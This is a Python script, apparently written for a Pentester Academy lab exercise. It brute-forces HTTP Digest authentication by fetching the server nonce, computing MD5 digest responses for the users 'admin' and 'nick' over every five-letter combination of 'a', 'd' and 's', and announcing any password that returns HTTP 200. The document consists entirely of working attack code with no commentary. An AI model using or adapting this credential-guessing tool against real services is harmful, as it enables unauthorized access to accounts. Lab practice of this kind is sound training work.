import itertools 
import time
from  threading import Thread
from queue import Queue 
import certifi
import urllib3
import hashlib

class ThreadUrl(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue
        
    def run(self) :
        while not self.queue.empty() :
            work = self.queue.get()
            http = urllib3.PoolManager(cert_reqs ='CERT_REQUIRED',ca_certs=certifi.where())
            try:
                httpnounce = http.request('GET', 'https://pentesteracademylab.appspot.com/lab/webapp/digest/1')
                nn=httpnounce.getheader('WWW-Authenticate').split(',')[1].split('=')[1].replace('"','')
                nounce= bytes(nn.encode('UTF-8'))
                password = work[1]
                user= work[0]
                h1 = hashlib.md5(bytes(user.encode('UTF-8')) + b':Pentester Academy:'+bytes(password.encode('UTF-8'))).hexdigest()
                h2 = hashlib.md5(b'GET:/lab/webapp/digest/1?').hexdigest()

                response= hashlib.md5(bytes(h1.encode('UTF-8')) + b":" + nounce + b":" + bytes(h2.encode('UTF-8'))).hexdigest()
                header_string = 'Digest username='+ user+' , realm = Pentester Academy,nonce='+nn+', uri=/lab/webapp/digest/1?, response='+ response
                httpResponse = http.request('GET', 'https://pentesteracademylab.appspot.com/lab/webapp/digest/1', headers={'authorization': header_string })
            except :
                print("Error")
            if httpResponse.status == 200:
                print(f'---------------------------------------------------------------------------------------------')
                print(f'-******************************************************************************************- ')
                print(f'-*************************** {work[1]} Is what you want for user {work[0]} ****************- ')
                print(f'-******************************************************************************************- ')
                print(f'---------------------------------------------------------------------------------------------')
                print("--- %s seconds ---" % (time.time() - start_time))
            else:
                print(f'XXXXX{work[1]} NotValid For  {h1} {h2} {response} {work[0]} XXXX ')
            self.queue.task_done()
                                
start_time = time.time()
print("Start Processing") 
request_queue = Queue()

def main():
    letters = itertools.product(['a', 'd', 's'],repeat=int(5))
    for i in letters:
        x = "".join(i)
        request_queue.put(('admin',x))
        request_queue.put(('nick',x))
        worker = ThreadUrl(request_queue)
        worker.setDaemon(True)
        worker.start()
main()



  





